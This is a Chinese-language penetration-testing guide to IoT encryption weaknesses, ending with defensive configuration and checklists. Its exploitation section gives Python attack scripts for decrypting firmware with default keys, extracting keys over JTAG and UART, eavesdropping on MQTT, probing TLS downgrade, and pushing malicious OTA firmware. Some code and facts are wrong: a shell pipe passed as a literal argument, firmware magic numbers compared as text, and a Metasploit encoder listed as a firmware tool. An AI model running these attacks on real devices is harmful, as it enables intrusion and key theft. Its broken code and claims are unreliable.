# IoT 加密安全测试

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供 IoT 设备加密安全测试的方法论。通过本指南，测试人员可以评估 IoT 设备的加密实现，发现固件加密、通信加密、密钥管理等方面的安全缺陷。

### 1.2 适用范围
本文档适用于以下场景：
- 智能家居设备安全测试
- 工业 IoT 设备评估
- 医疗设备加密审计
- 车联网安全测试
- 可穿戴设备安全评估

### 1.3 读者对象
- IoT 安全测试人员
- 嵌入式系统安全研究员
- 渗透测试工程师
- 硬件安全测试人员

---

## 第二部分：核心渗透技术专题

### 专题一：IoT 加密安全测试

#### 2.1 技术介绍

**IoT 加密安全测试**是对物联网设备的加密实现进行全面评估，包括固件加密、通信协议加密、安全启动、密钥存储等方面。

**IoT 加密测试维度：**

| 维度 | 检测内容 | 风险等级 |
|------|---------|---------|
| 固件加密 | 固件加密、签名验证 | 严重 |
| 安全启动 | Bootloader 验证 | 严重 |
| 通信加密 | TLS/DTLS、专有协议 | 高危 |
| 密钥存储 | Secure Element、TEE | 严重 |
| OTA 更新 | 更新包签名验证 | 严重 |
| 调试接口 | JTAG、UART 保护 | 高危 |

**IoT 设备典型架构：**
```
┌─────────────────────────────────────────┐
│              应用层                      │
│  (MQTT/CoAP/HTTP + TLS)                 │
├─────────────────────────────────────────┤
│              网络层                      │
│  (WiFi/BLE/Zigbee/LoRa)                 │
├─────────────────────────────────────────┤
│              安全层                      │
│  (Secure Boot, Secure Storage)          │
├─────────────────────────────────────────┤
│              硬件层                      │
│  (MCU, Secure Element, TPM)             │
└─────────────────────────────────────────┘
```

#### 2.2 测试常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 智能家居 | 智能门锁、摄像头 | 未加密视频流、弱认证 |
| 工业 IoT | PLC、传感器 | 专有协议未加密 |
| 医疗设备 | 胰岛素泵、起搏器 | 命令未认证加密 |
| 车联网 | T-Box、OBD | CAN 总线未加密 |
| 可穿戴 | 智能手表、手环 | 健康数据未加密 |
| 智慧城市的 | 监控、传感器 | 固件未签名 |

#### 2.3 漏洞检测方法

##### 2.3.1 固件分析

```bash
# 提取固件
# 方法 1: 从设备闪存读取
flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware.bin

# 方法 2: 从更新包提取
wget http://vendor.com/firmware_update.zip
unzip firmware_update.zip

# 方法 3: JTAG/SWD 读取
openocd -f interface/stlink.cfg -f target/stm32.cfg -c "dump_image firmware.bin 0x08000000 0x100000"

# 固件分析
binwalk -e firmware.bin
firmwalker firmware.bin

# 检查加密和签名
strings firmware.bin | grep -i "encrypt\|decrypt\|aes\|rsa"
```

##### 2.3.2 通信协议分析

```bash
# 捕获 WiFi 流量
airodump-ng --bssid TARGET_MAC --channel 6 -w capture wlan0mon

# 捕获 BLE 流量
ubertooth-rx -a TARGET_MAC -c capture.pcap

# 捕获 Zigbee 流量
killerbee -i uart0 zbidump

# 分析 MQTT 流量
wireshark capture.pcap -Y "mqtt"

# 检查是否加密
# 如果能看到明文主题和数据，说明未加密
```

##### 2.3.3 调试接口检测

```bash
# 检查 UART
# 寻找 TX/RX/GND 引脚
# 使用 USB-TTL 适配器连接
screen /dev/ttyUSB0 115200

# 检查 JTAG
# 使用 JTAGulator 或手动探测
# 引脚：TCK, TMS, TDI, TDO, GND, VCC

# 使用 OpenOCD 连接
openocd -f interface/stlink.cfg -f target/stm32.cfg

# 检查 SWD
# 引脚：SWDIO, SWCLK, GND, VCC
```

##### 2.3.4 加密实现检测

```python
#!/usr/bin/env python3
"""
IoT 设备加密实现检测
"""
import subprocess
import re

def analyze_firmware_crypto(firmware_path):
    """分析固件中的加密实现"""
    
    # 提取字符串
    result = subprocess.run(['strings', firmware_path], capture_output=True, text=True)
    content = result.stdout
    
    # 检测加密算法
    crypto_patterns = {
        'AES': r'aes|AES|rijndael',
        'RSA': r'rsa|RSA|rsapkcs',
        'ECC': r'ecc|ECC|ecdsa|secp',
        'SHA': r'sha|SHA|hash',
        'DES': r'des|DES|3des',
        'RC4': r'rc4|RC4|arcfour',
    }
    
    found = {}
    for name, pattern in crypto_patterns.items():
        if re.search(pattern, content, re.IGNORECASE):
            found[name] = True
    
    print("[*] 检测到的加密算法:")
    for algo in found:
        print(f"    - {algo}")
    
    # 检测硬编码密钥
    key_patterns = [
        r'[0-9a-fA-F]{32}',  # 128 位密钥
        r'[0-9a-fA-F]{64}',  # 256 位密钥
        r'-----BEGIN.*KEY-----',
    ]
    
    print("\n[*] 搜索硬编码密钥...")
    for pattern in key_patterns:
        matches = re.findall(pattern, content)
        if matches:
            print(f"[!] 发现可能的密钥：{matches[:3]}")
    
    # 检测加密模式
    mode_patterns = {
        'ECB': r'ecb|ECB',
        'CBC': r'cbc|CBC',
        'CTR': r'ctr|CTR',
        'GCM': r'gcm|GCM',
    }
    
    print("\n[*] 检测加密模式:")
    for mode, pattern in mode_patterns.items():
        if re.search(pattern, content, re.IGNORECASE):
            print(f"    - {mode}")
            if mode == 'ECB':
                print("        [!] ECB 模式不安全")

# 使用示例
# analyze_firmware_crypto("firmware.bin")
```

#### 2.4 漏洞利用方法

##### 2.4.1 固件解密

```python
#!/usr/bin/env python3
"""
IoT 固件解密攻击
"""
from Crypto.Cipher import AES
import binascii

def decrypt_firmware(encrypted_firmware, key, iv=None):
    """尝试解密固件"""
    
    # 尝试不同模式
    modes = [
        ('AES-128-ECB', AES.MODE_ECB, None),
        ('AES-128-CBC', AES.MODE_CBC, iv or b'\x00' * 16),
        ('AES-128-CTR', AES.MODE_CTR, iv or b'\x00' * 16),
    ]
    
    for mode_name, mode, nonce in modes:
        try:
            if mode == AES.MODE_ECB:
                cipher = AES.new(key, mode)
            else:
                cipher = AES.new(key, mode, nonce)
            
            decrypted = cipher.decrypt(encrypted_firmware)
            
            # 检查是否是有效固件（魔数检查）
            if decrypted[:4] in [b'\x7fELF', b'55AA', b'FEEDFACE']:
                print(f"[+] 使用 {mode_name} 解密成功")
                return decrypted
        except Exception as e:
            print(f"[-] {mode_name} 解密失败：{e}")
    
    print("[-] 所有模式解密失败")
    return None

# 常见 IoT 厂商默认密钥
default_keys = [
    b'\x00' * 16,
    b'1234567890123456',
    b'admin1234567890',
    b'8888888888888888',
]

# 使用示例
# with open('encrypted_firmware.bin', 'rb') as f:
#     encrypted = f.read()
# for key in default_keys:
#     result = decrypt_firmware(encrypted, key)
#     if result:
#         with open('decrypted.bin', 'wb') as f:
#             f.write(result)
```

##### 2.4.2 安全启动绕过

```bash
# 安全启动绕过方法

# 方法 1: 禁用安全启动熔丝
# 使用 JTAG 读取/写入 eFuse
# 风险：可能永久损坏设备

# 方法 2: Bootloader 漏洞利用
# 寻找 bootloader 中的缓冲区溢出
# 例如：ESP32 Secure Boot 绕过

# 方法 3: 签名验证绕过
# 某些实现未正确验证签名
# 可以修改固件后重新签名

# 方法 4: 调试接口利用
# 通过 JTAG/SWD 直接读取闪存
# 绕过安全启动检查
```

##### 2.4.3 密钥提取

```python
#!/usr/bin/env python3
"""
从 IoT 设备提取密钥
"""
import subprocess

def extract_keys_jtag():
    """使用 JTAG 提取密钥"""
    
    # 连接 JTAG
    openocd_script = """
    init
    reset halt
    dump_image memory.bin 0x08000000 0x10000
    exit
    """
    
    with open('openocd.cfg', 'w') as f:
        f.write(openocd_script)
    
    subprocess.run(['openocd', '-f', 'interface/stlink.cfg', 
                    '-f', 'target/stm32.cfg', '-f', 'openocd.cfg'])
    
    # 在内存转储中搜索密钥
    subprocess.run(['strings', 'memory.bin', '|', 'grep', '-E', 
                    '[0-9a-fA-F]{32}|[0-9a-fA-F]{64}'])

def extract_keys_uart():
    """通过 UART 提取密钥"""
    
    # 连接 UART
    import serial
    ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)
    
    # 发送命令（如果有 CLI）
    ser.write(b'show keys\n')
    response = ser.read(1024)
    print(response)
    
    # 或者触发错误泄露密钥
    ser.write(b'A' * 1000 + b'\n')
    response = ser.read(4096)
    print(response)

# 注意：这些方法仅用于授权测试
```

##### 2.4.4 通信加密攻击

```python
#!/usr/bin/env python3
"""
IoT 通信加密攻击
"""
from scapy.all import *
import ssl

def attack_mqtt_unencrypted(broker_ip, topic):
    """攻击未加密的 MQTT 通信"""
    
    # 订阅主题（无需认证）
    from paho.mqtt import client as mqtt_client
    
    client = mqtt_client.Client()
    client.connect(broker_ip, 1883)
    client.subscribe(topic)
    
    print(f"[*] 已订阅主题：{topic}")
    
    def on_message(client, userdata, msg):
        print(f"[+] 收到消息：{msg.topic} - {msg.payload}")
    
    client.on_message = on_message
    client.loop_forever()

def attack_tls_downgrade(target_ip, target_port):
    """TLS 降级攻击"""
    
    # 尝试连接不同 TLS 版本
    tls_versions = [
        ('TLS 1.3', ssl.TLSVersion.TLSv1_3),
        ('TLS 1.2', ssl.TLSVersion.TLSv1_2),
        ('TLS 1.1', ssl.TLSVersion.TLSv1_1),
        ('TLS 1.0', ssl.TLSVersion.TLSv1),
        ('SSL 3.0', ssl.TLSVersion.SSLv3),
    ]
    
    for name, version in tls_versions:
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.minimum_version = version
            context.maximum_version = version
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            wrapped = context.wrap_socket(sock, server_hostname=target_ip)
            wrapped.connect((target_ip, target_port))
            
            print(f"[+] {name} 连接成功")
            wrapped.close()
            
        except Exception as e:
            print(f"[-] {name} 连接失败：{e}")

# 使用示例
# attack_mqtt_unencrypted("192.168.1.100", "device/+")
# attack_tls_downgrade("192.168.1.100", 8883)
```

##### 2.4.5 OTA 更新攻击

```python
#!/usr/bin/env python3
"""
OTA 更新攻击
"""
import hashlib
import requests

def attack_ota_no_signature(update_url, malicious_firmware):
    """攻击无签名验证的 OTA 更新"""
    
    # 读取恶意固件
    with open(malicious_firmware, 'rb') as f:
        firmware_data = f.read()
    
    # 上传恶意固件
    files = {'firmware': firmware_data}
    resp = requests.post(update_url, files=files)
    
    if resp.status_code == 200:
        print("[+] 恶意固件上传成功")
        print("[!] 设备将在下次启动时刷入恶意固件")
    else:
        print(f"[-] 上传失败：{resp.status_code}")

def attack_ota_weak_hash(update_url, original_firmware, malicious_firmware):
    """攻击使用弱哈希校验的 OTA"""
    
    # 计算原始固件哈希
    with open(original_firmware, 'rb') as f:
        original_hash = hashlib.md5(f.read()).hexdigest()
    
    # 修改恶意固件使其哈希碰撞（理论上可能，实际困难）
    # 或者寻找哈希校验实现漏洞
    
    print(f"[*] 原始固件 MD5: {original_hash}")
    print("[!] 尝试哈希碰撞攻击...")
    
    # 实际攻击需要专门的碰撞工具
```

#### 2.5 安全配置建议

##### 2.5.1 IoT 设备安全启动配置

```c
// STM32 安全启动配置示例
void secure_boot_config(void) {
    // 启用读保护
    FLASH_OBProgramInitTypeDef OBInit;
    OBInit.OptionType = OPTIONBYTE_RDP;
    OBInit.RDPLevel = OB_RDP_LEVEL_1;  // 级别 1 保护
    HAL_FLASHEx_OBProgram(&OBInit);
    
    // 启用写保护
    OBInit.OptionType = OPTIONBYTE_WRP;
    OBInit.WRPState = OB_WRPSTATE_ENABLE;
    OBInit.WRPPage = 0x000000FF;  // 保护前 256 页
    HAL_FLASHEx_OBProgram(&OBInit);
    
    // 设置安全启动标志
    // 在备份寄存器中存储签名
}
```

##### 2.5.2 IoT 通信加密配置

```c
// mbedTLS 配置示例
#include "mbedtls/ssl.h"

void configure_ssl(mbedtls_ssl_config *conf) {
    mbedtls_ssl_config_defaults(conf,
        MBEDTLS_SSL_IS_CLIENT,
        MBEDTLS_SSL_TRANSPORT_STREAM,
        MBEDTLS_SSL_PRESET_DEFAULT);
    
    // 仅启用 TLS 1.2+
    mbedtls_ssl_conf_min_version(conf, MBEDTLS_SSL_MAJOR_VERSION_3,
                                      MBEDTLS_SSL_MINOR_VERSION_3);
    
    // 配置强加密套件
    const int ssl_ciphersuites[] = {
        MBEDTLS_TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
        MBEDTLS_TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
        MBEDTLS_TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
        0
    };
    mbedtls_ssl_conf_ciphersuites(conf, ssl_ciphersuites);
    
    // 启用证书验证
    mbedtls_ssl_conf_authmode(conf, MBEDTLS_SSL_VERIFY_REQUIRED);
}
```

##### 2.5.3 IoT 加密检查清单

**固件安全:**
- [ ] 固件加密存储
- [ ] 固件签名验证
- [ ] 安全启动启用
- [ ] 调试接口禁用
- [ ] 闪存读保护

**通信安全:**
- [ ] TLS 1.2+ 加密
- [ ] 证书验证启用
- [ ] 强加密套件
- [ ] 前向保密
- [ ] 证书固定（可选）

**密钥管理:**
- [ ] 使用 Secure Element/TEE
- [ ] 密钥不硬编码
- [ ] 唯一设备密钥
- [ ] 密钥轮换机制
- [ ] 安全密钥派生

**OTA 安全:**
- [ ] 更新包签名
- [ ] 安全下载（HTTPS）
- [ ] 回滚保护
- [ ] 原子更新
- [ ] 更新失败恢复

---

## 第三部分：附录

### 3.1 IoT 安全测试工具

| 工具 | 用途 |
|-----|------|
| binwalk | 固件分析 |
| firmwalker | 固件安全扫描 |
| OpenOCD | JTAG/SWD 调试 |
| Ubertooth | BLE 抓包 |
| KillerBee | Zigbee 安全测试 |
| Shikata ga nai | 固件混淆 |

### 3.2 IoT 加密风险评级

| 风险 | 影响 | 常见设备 |
|-----|------|---------|
| 未加密固件 | 完全控制 | 摄像头、路由器 |
| 无安全启动 | 恶意固件 | 智能家居设备 |
| 明文通信 | 数据泄露 | 传感器、穿戴设备 |
| 硬编码密钥 | 批量沦陷 | 廉价 IoT 设备 |
| 调试接口暴露 | 密钥提取 | 开发阶段设备 |

### 3.3 IoT 安全标准

| 标准 | 适用范围 |
|------|---------|
| ETSI EN 303 645 | 消费级 IoT |
| NIST IR 8259 | IoT 网络安全 |
| ioXt | IoT 安全认证 |
| UL 2900 | 联网产品安全 |

---

## 参考资源

- [OWASP IoT Top 10](https://owasp.org/www-project-internet-of-things/)
- [IoT Security Foundation](https://www.iotsecurityfoundation.org/)
- [NIST IoT Cybersecurity](https://www.nist.gov/programs-projects/internet-things-iot-cybersecurity)
- [Practical IoT Hacking](https://www.practical-iot-hacking.com/)
